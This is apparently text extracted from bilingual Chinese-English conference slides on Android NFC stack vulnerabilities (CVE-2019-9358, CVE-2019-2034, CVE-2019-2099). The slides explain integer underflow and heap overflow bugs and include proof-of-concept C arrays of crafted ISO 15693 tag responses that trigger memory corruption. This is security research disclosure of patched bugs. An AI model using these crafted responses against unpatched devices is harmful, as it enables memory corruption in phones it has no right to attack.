T3T_SYSTEM_CODE_NDEF is 0x12FC, means only NDEF card will be 
process, other raw data will be delivered to upper layer directly
CVE-2019-9358
• 当我们写一个NFC-F卡模拟应用时，我们需要在一个XML档案中写
入如下元数据
When writing a NFC-F Host Card Emulation application, we defines following 
metadata in a xml file
CVE-2019-9358
• 稍后在com.android.nfc进程中, 
system code会被校验
Later in process com.android.nfc, 
system code is validated
• 令人惊讶的是，只有4XXX形式
的code会被放行
Surprisingly, only 4XXX is allowed 
(with some exceptions)
I want to
parse NDEF 
commands
No you 
don’t
NFC stack(C)
validator(Java)
frameworks/base/core/java/android/nfc/cardemulation/NfcFCardEmulation.java
CVE-2019-9358
• 这种自相矛盾的设计使得此漏洞无法被利
This self-contradictory feature makes this bug un-exploitable
• 为了向Google证明此漏洞我修改了Java代码来绕过校验
To prove it to Google I slightly altered the code to bypass the validation
• 使用了两部设备，一个作为攻击者，一个作为受害者
Then two phones are involved, one as attacker, one as victim
CVE-2019-2034
• 谷歌评级为高危, 在2019-04-01的补丁中修复, scored as High by 
Google, fix in 2019-04-01, patched in 
https://android.googlesource.com/platform/system/nfc/+/14e2f9df7
9ecb25db9e88843406d738d607101b4
• 经典的长度问题，数十个类似漏洞中同样有此问题
Typical length issues found in tens of similar bugs
• 发现于ISO 15693协定叠
Found in ISO 15693 stack
CVE-2019-2034
• gki缓冲区运行特点
How gki buffer works
• NFC协定叠包含多个层次，每一层都会在资料外侧加一层 buffer   
NFC stack has multiple layers, each with its own header
• 引入了offset字段
Introduce the offset field
• 当需要剥离某层header时，仅需要增加offset并减少len
When certain 
header need to be striped, just increase offset and decrease len
• 降低了反复拷贝缓冲区的频度
Reduce the frequency of buffer copy
Access primitive: (uint8_t*)(p_hdr + 1) + p_hdr->offset
CVE-2019-2034
CVE-2019-2034
zero length is not validated
length underflow helps take this 
branch,
results in p_resp->len underflow
either callback will result in 
OOBW
CVE-2019-2034
CVE-2019-2034
This code itself 
is also buggy, 
we will see it 
later
CVE-2019-2034
• 总结 Summary
• 缺少对长度为0情况的校验，导致整数型下溢 Lack of validation of zero sized 
length, results in underflow
• length的下溢帮助绕过进一步校验，进而导致p_resp->len下溢 length 
underflow helps bypass check, results p_resp->len underflow
• 产生溢出的p_resp被赋值给rw_data，接著被传递给callback函数
Overflowed p_resp assigned to rw_data, then passed to callback function
• 最终nfa_rw_store_ndef_rx_buf被调用，使用溢出的长度进行memcpy导致
记忆体破坏
nfa_rw_store_ndef_rx_buf is finally called, and memcpy with corrupted len
CVE-2019-2034
• 长度为0的缓冲区数据可控吗？
Is zero sized buffer data controllable?
• 看起来长度为0的缓冲区攻击者没法控制
It seems buffer with 0 size can’t transfer user controlled data
• 但是，还记得gki是基于ring buffer的内存管理器吗？也就是说，其记忆体
布局一定程度上可以预测、控制
However, gki managed memory is predictable(fengshui?), similar to heap
CVE-2019-2034
• PoC
https://github.com/hyrathon/PoCs/tree/master/
CVE-2019-2034
……
static uint8_t TSND_GET_CC[sizeof(RSP_GET_CC) * 2 + 2] = {0};
//data ndef tlv
static uint8_t CMD_NDEF_TLV[]= {
0x22, 0x20, //flag, cmd code
UID
0x01, // block number
};
static uint8_t RSP_NDEF_TLV[] ={
0x00, //flags
0x03, //I93_ICODE_TLV_TYPE_NDEF
//0x08, //tlv_len or
0xff,
0xff,
0xff, // (alternative)16 bit tlv_len
0x00, 0x00, 0x00, 0x00,
0xfe, //terminator
0xff, 0xff
};
static uint8_t TSND_NDEF_TLV[sizeof(RSP_NDEF_TLV) * 2 + 2] = {0};
//data check lock
static uint8_t CMD_CHK_LOK[] = {
0x62, 0x20, // flag, cmd code
UID
0x01 // block number
};
static uint8_t RSP_CHK_LOK[] = {
0x00, // flag
0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01,
0xff, 0xff
};
static uint8_t TSND_CHK_LOK[sizeof(RSP_CHK_LOK) * 2 + 2] = {0};
//ndef read data
static uint8_t CMD_READ_NDEF[] = {
0x22, 0x20, //flag, cmd code
UID
0x00, // tag number
};
static uint8_t RSP_READ_NDEF[] = {
//0x00, //flag
0x00, 0x00, //dontknowwhat
//0xd1, 0x01, 0x04, 0x54, 0x02, 0x7a, 0x68, 0x68, // some 
valid ndef info
};
static uint8_t TSND_READ_NDEF[sizeof(RSP_READ_NDEF) * 2 + 2] = {0};
……
CVE-2019-2099
• 被Google评级为高危，在2019-06-01的补丁中修复
scored as High by Google， patched in 
• https://android.googlesource.com/platform/system/nfc/+/f0236aa9b
d07b26d5f85cb5474561f60156f833f
• 发现于nfa模组之nfa_rw_store_ndef_rx_buf
Found in nfa_rw_store_ndef_rx_buf of nfa component
CVE-2019-2099
CVE-2019-2099
• 多项协定叠有用到nfc来存储临时资料，正如前述CVE-2019-2034所示
Multiple protocol stacks needs to store data temporarily in nfa, as shown in CVE-
2019-2034 
rw_t3t_data_cback
rw_t3t_act_handle_
check_rsp
rw_t3t_act_handle_
check_ndef_rsp
nfa_rw_handle_t3t_
evt
nfa_rw_handle_t4t_
evt
nfa_rw_handle_i93_
evt
rw_t4t_data_cback
rw_i93_data_cback
rw_t4t_sm_read_nd
ef
rw_i93_sm_read_nd
ef
nfa_rw_store_ndef
_rx_buf
protocol stack
nfa
CVE-2019-2099
• 上述协定允许接收分片资料包。 nfa_rw_store_ndef_rx_buf负责将收
到的部分内容贮存在nfa_rw_cb.p_ndef_buf中，并增加
nfa_rw_cb.ndef_rd_offset的值来代表收到数据的增长。
These three protocol allows fragmentation,  nfa_rw_store_ndef_rx_buf is 
dedicated to store data to nfa_rw_cb.p_ndef_buf, then increase 
nfa_rw_cb.ndef_rd_offset to reflect the current offset of the buffer
CVE-2019-2099
CVE-2019-2099
• 对nfa_rw_cb.ndef_rd_offset数值没有验证
No validation of nfa_rw_cb.ndef_rd_offset is made
• 持续不断传递咨讯（来增大nfa_rw_cb.ndef_rd_offse）并不挂断当
前会话，最终会导致heap上产生溢出
Keep sending data and don’t hang up the current session, finally heap 
overflow happen will happen
CVE-2019-2099
• PoC
https://github.com/hyrathon/PoCs/tree/master/
CVE-2019-2099
//ndef read data
static uint8_t CMD_READ_NDEF[] = {
0x22, 0x20, //flag, cmd code
UID
0x00, // tag number
};
static uint8_t RSP_READ_NDEF[] = {
//0x00, //flag
0x00, 0x00, //dontknowwhat
0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 
0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 
0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 
0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 
0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 
0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 
0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 
0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 
0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 
0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 
0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 
0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 
0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 
0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 
//0xd1, 0x01, 0x04, 0x54, 0x02, 0x7a, 0x68, 0x68, // some valid ndef info
};
static uint8_t TSND_READ_NDEF[sizeof(RSP_READ_NDEF) * 2 + 2] = {0};
总结 Summary
• NFC基础 & NFC在Android上的实现
NFC basics & NFC on Android
• 攻击面探讨 & 攻击目标选择
Attack surface & choice of target
• 原理，漏洞发掘手段选择，Proxmark 3
Concepts, method of bug hunting, Proxmark 3
• 实例研究
Case study
思考 Closing Thoughts
• 难以模糊测试 Hard to fuzz
• 难以利用 Hard to exploit
• 物理接触 Physical contact
• 跨设备 Inter-device
• 处理代码位于沙箱化的、开启多种保护的进程中
Parse in a sandboxed, fully mitigated process
• 潜在研究方向 Future work
• Hal
• SoC
• Kernel
参考联结
References
[1] https://github.com/Proxmark/proxmark3
[2] https://developer.android.com/guide/topics/connectivity/nfc/hce
[3] https://smartlockpicking.com/
致谢 Credits
• 感谢360 Alpha Team的成员，在研究过程中给我的帮助和激励
演示
Demo
感谢聆听
Thanks